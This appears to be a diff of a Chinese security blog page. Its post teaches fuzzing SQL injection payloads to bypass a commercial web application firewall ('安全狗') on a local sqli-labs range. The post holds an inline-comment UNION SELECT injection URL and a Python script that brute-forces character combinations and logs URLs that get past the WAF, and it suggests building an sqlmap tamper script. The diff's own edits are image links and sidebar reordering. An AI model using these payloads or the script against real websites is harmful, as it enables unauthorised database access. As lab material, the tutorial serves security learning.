@@ -406,25 +406,25 @@ height:50vh;
 <h5 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h5><h6 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h6><p>测试靶场：sqli-libs</p>
 <p>安全软件：某狗最新版</p>
 <p>首先安装配置安全狗，在此之前需要安装好phpstudy，和配置sqli-libs靶场，在此便不赘述！</p>
-<p><img src="https://img-blog.csdnimg.cn/20190317131456924.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0pCbG9jaw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><img src="https://www.fuzzer.xyz/images/fuzz/9.png" alt="在这里插入图片描述"></p>
 <p>把http防护打开，其它防护都关掉，以免影响我们测试！</p>
-<p><img src="https://img-blog.csdnimg.cn/20190317131527935.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0pCbG9jaw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><img src="https://www.fuzzer.xyz/images/fuzz/10.png" alt="在这里插入图片描述"></p>
 <p>因为我们进行本地测试，需要发送大量请求！这种情况会触发狗狗的cc防护和ddos防护，所以为了我们能大量得到payload！这里我们关闭IP黑名单和爬虫黑名单！</p>
-<p><img src="https://img-blog.csdnimg.cn/20190317131538984.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0pCbG9jaw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><img src="https://www.fuzzer.xyz/images/fuzz/16.png" alt="在这里插入图片描述"></p>
 <p>可以看到http防护已经全开！</p>
 <h6 id="FUZZ思路"><a href="#FUZZ思路" class="headerlink" title="FUZZ思路"></a>FUZZ思路</h6><p>我们的思路其实很简单！就是利用特殊字符和数字字母，特殊编码的字符遍历组合在一起进行模糊测试！这次我们利用内联注释来进行基础来进行fuzz，首先测试一下使用内联注释会不会被狗给拦了！</p>
 <p>语句：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.23.149/sqli/Less-1/?id=id=1/*!union*//*!select*/1,2,3</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20190317131551999.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0pCbG9jaw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><img src="https://www.fuzzer.xyz/images/fuzz/17.png" alt="在这里插入图片描述"></p>
 <p>这时候还是会被狗拦了！所以我们可以发现安全狗对一般的注入还是有一定防护能力的！</p>
 <p>接下来贴上我们的FUZZ脚本</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ! -*- encoding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># python3</span></span><br><span class="line"><span class="comment">#比较全</span></span><br><span class="line"><span class="comment"># fuzz_zs = ['/*','*/','/*!','?','*','=','`','~','!','@','%','.','-','+','|','%00'.'%20' ,'%09', '%0a', '%0b', '%0c', '%0d' ,</span></span><br><span class="line"><span class="comment"># '%a0' ,'/**/']</span></span><br><span class="line"><span class="comment"># fuzz_sz = ['0','1','2','3','4','5','6','7','8','9']</span></span><br><span class="line"><span class="comment"># fuzz_ch = ["%0a","%0b","%0c","%0d","%0e","%0f","%0g","%0h","%0i","%0j","%0k","%0l","%0m","%0n",</span></span><br><span class="line"><span class="comment"># "%0o","%0p","%0q","%0r","%0s","%0t","%0u","%0v","%0w","%0x","%0y","%0z"]</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">#精简</span></span><br><span class="line">fuzz_zs = [<span class="string">'/*'</span>, <span class="string">'*/'</span>, <span class="string">'/*!'</span>, <span class="string">'*'</span>, <span class="string">'='</span>, <span class="string">'`'</span>, <span class="string">'!'</span>, <span class="string">'@'</span>, <span class="string">'%'</span>, <span class="string">'.'</span>, <span class="string">'-'</span>, <span class="string">'+'</span>, <span class="string">'|'</span>, <span class="string">'%00'</span>]</span><br><span class="line"></span><br><span class="line">fuzz_sz = [<span class="string">''</span>, <span class="string">' '</span>]</span><br><span class="line"></span><br><span class="line">fuzz_ch = [<span class="string">"%0a"</span>, <span class="string">"%0b"</span>, <span class="string">"%0c"</span>, <span class="string">"%0d"</span>, <span class="string">"%0e"</span>, <span class="string">"%0f"</span>, <span class="string">"%0g"</span>, <span class="string">"%0h"</span>, <span class="string">"%0i"</span>, <span class="string">"%0j"</span>]</span><br><span class="line"></span><br><span class="line">fuzz = fuzz_zs + fuzz_sz + fuzz_ch</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.221 Safari/537.36 SE 2.X MetaSr 1.0"</span>&#125;</span><br><span class="line"></span><br><span class="line">url_start = <span class="string">"http://192.168.23.149/sqli/Less-1/?id=1"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> fuzz:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> fuzz:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> fuzz:</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> fuzz:</span><br><span class="line"></span><br><span class="line">                exp = <span class="string">"/*!union"</span> + a + b + c + d + <span class="string">"select*/ 1,2,3"</span></span><br><span class="line"></span><br><span class="line">                url = url_start + exp</span><br><span class="line"></span><br><span class="line">                res = requests.get(url=url, headers=headers)</span><br><span class="line"></span><br><span class="line">                print(<span class="string">"Now URL:"</span> + url)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> <span class="string">"Login"</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                    print(<span class="string">"Find Fuzz bypass:"</span> + url)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">with</span> open(<span class="string">"H:ip.txt"</span>, <span class="string">'a'</span>, encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> r:</span><br><span class="line">                        r.write(url + <span class="string">"\n"</span>)</span><br></pre></td></tr></table></figure>
 <p>这里我们使用精简的payload组合！因为组合起来真是太多了，我计算了一下请看图！</p>
-<p><img src="https://img-blog.csdnimg.cn/20190317131718736.png" alt="在这里插入图片描述"></p>
+<p><img src="https://www.fuzzer.xyz/images/fuzz/18.png" alt="在这里插入图片描述"></p>
 <p>对！就是3个亿组合，这里才五层嵌套！我就跑了几秒！已经找到近千种bybass姿势了！</p>
-<p><img src="https://img-blog.csdnimg.cn/20190317132026144.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0pCbG9jaw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><img src="https://www.fuzzer.xyz/images/fuzz/4.png" alt="在这里插入图片描述"></p>
 <p>我们随便找一个！进行测试！</p>
-<p><img src="https://img-blog.csdnimg.cn/20190317132035759.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0pCbG9jaw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><img src="https://www.fuzzer.xyz/images/fuzz/14.png" alt="在这里插入图片描述"></p>
 <p>发现成功bypass！</p>
 <p>接下来你可以继续手工注入！更方便的是你可以直接写一个sqlmap的tamper自动化注入~</p>
 <h5 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h5><p>FUZZ作为一种重要的漏洞挖掘姿势！今天利用一个实例以及脚本编写对其进行介绍，这里你可以用成千上万种姿势绕过常规安全软件的软waf！下次我会就FUZZ测试流程以及FUZZ工具使用进行介绍！欢迎各位前来斧正！</p>
@@ -934,10 +934,6 @@ top:50vh;
     
     
     
-    
-    
-    
-    
     <div class="total-and-search">
         <div class="total-archive">
         Total : 26
@@ -1026,12 +1022,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">03/13</span><a class="archive-post-title" href="/2019/03/13/php代码审计之函数漏洞审计(上)/">php代码审计之函数漏洞审计(上)</a>
+            <span class="archive-post-date">03/13</span><a class="archive-post-title" href="/2019/03/13/php代码审计之函数漏洞审计(下)/">php代码审计之函数漏洞审计(下)</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">03/13</span><a class="archive-post-title" href="/2019/03/13/php代码审计之函数漏洞审计(下)/">php代码审计之函数漏洞审计(下)</a>
+            <span class="archive-post-date">03/13</span><a class="archive-post-title" href="/2019/03/13/php代码审计之函数漏洞审计(上)/">php代码审计之函数漏洞审计(上)</a>
         </li>
     
     
@@ -1046,7 +1042,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">03/01</span><a class="archive-post-title" href="/2019/03/01/SQL注入回顾篇(四)/">SQL注入回顾篇(4)</a>
+            <span class="archive-post-date">03/01</span><a class="archive-post-title" href="/2019/03/01/SQL注入回顾篇(三)/">SQL注入回顾篇(3)</a>
         </li>
     
     
@@ -1056,12 +1052,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">03/01</span><a class="archive-post-title" href="/2019/03/01/SQL注入回顾篇(三)/">SQL注入回顾篇(3)</a>
+            <span class="archive-post-date">03/01</span><a class="archive-post-title" href="/2019/03/01/SQL注入回顾篇(一)/">SQL注入回顾篇(1)</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">03/01</span><a class="archive-post-title" href="/2019/03/01/SQL注入回顾篇(一)/">SQL注入回顾篇(1)</a>
+            <span class="archive-post-date">03/01</span><a class="archive-post-title" href="/2019/03/01/SQL注入回顾篇(四)/">SQL注入回顾篇(4)</a>
         </li>
     
     
@@ -1100,13 +1096,9 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="fuzz 脚本"><span class="iconfont-archer">&#xe606;</span>fuzz 脚本</span>
     
-        <span class="sidebar-tag-name" data-tags="php代码审计"><span class="iconfont-archer">&#xe606;</span>php代码审计</span>
-    
         <span class="sidebar-tag-name" data-tags="工具"><span class="iconfont-archer">&#xe606;</span>工具</span>
     
-        <span class="sidebar-tag-name" data-tags="系统"><span class="iconfont-archer">&#xe606;</span>系统</span>
-    
-        <span class="sidebar-tag-name" data-tags="时光"><span class="iconfont-archer">&#xe606;</span>时光</span>
+        <span class="sidebar-tag-name" data-tags="php代码审计"><span class="iconfont-archer">&#xe606;</span>php代码审计</span>
     
         <span class="sidebar-tag-name" data-tags="web"><span class="iconfont-archer">&#xe606;</span>web</span>
     
@@ -1114,25 +1106,29 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="web安全"><span class="iconfont-archer">&#xe606;</span>web安全</span>
     
-        <span class="sidebar-tag-name" data-tags="curl"><span class="iconfont-archer">&#xe606;</span>curl</span>
+        <span class="sidebar-tag-name" data-tags="系统"><span class="iconfont-archer">&#xe606;</span>系统</span>
+    
+        <span class="sidebar-tag-name" data-tags="时光"><span class="iconfont-archer">&#xe606;</span>时光</span>
+    
+        <span class="sidebar-tag-name" data-tags="命令注入，攻防"><span class="iconfont-archer">&#xe606;</span>命令注入，攻防</span>
+    
+        <span class="sidebar-tag-name" data-tags="sql注入，攻防"><span class="iconfont-archer">&#xe606;</span>sql注入，攻防</span>
     
         <span class="sidebar-tag-name" data-tags="phar反序列化"><span class="iconfont-archer">&#xe606;</span>phar反序列化</span>
     
-        <span class="sidebar-tag-name" data-tags="sql注入，攻防"><span class="iconfont-archer">&#xe606;</span>sql注入，攻防</span>
+        <span class="sidebar-tag-name" data-tags="curl"><span class="iconfont-archer">&#xe606;</span>curl</span>
     
         <span class="sidebar-tag-name" data-tags="PHP"><span class="iconfont-archer">&#xe606;</span>PHP</span>
     
         <span class="sidebar-tag-name" data-tags="fuzz"><span class="iconfont-archer">&#xe606;</span>fuzz</span>
     
-        <span class="sidebar-tag-name" data-tags="命令注入，攻防"><span class="iconfont-archer">&#xe606;</span>命令注入，攻防</span>
-    
         <span class="sidebar-tag-name" data-tags="fuzz 工具"><span class="iconfont-archer">&#xe606;</span>fuzz 工具</span>
     
         <span class="sidebar-tag-name" data-tags="逆向破解"><span class="iconfont-archer">&#xe606;</span>逆向破解</span>
     
-        <span class="sidebar-tag-name" data-tags="python"><span class="iconfont-archer">&#xe606;</span>python</span>
-    
         <span class="sidebar-tag-name" data-tags="xss"><span class="iconfont-archer">&#xe606;</span>xss</span>
+    
+        <span class="sidebar-tag-name" data-tags="python"><span class="iconfont-archer">&#xe606;</span>python</span>
     
         <span class="sidebar-tag-name" data-tags="安卓架构"><span class="iconfont-archer">&#xe606;</span>安卓架构</span>
     
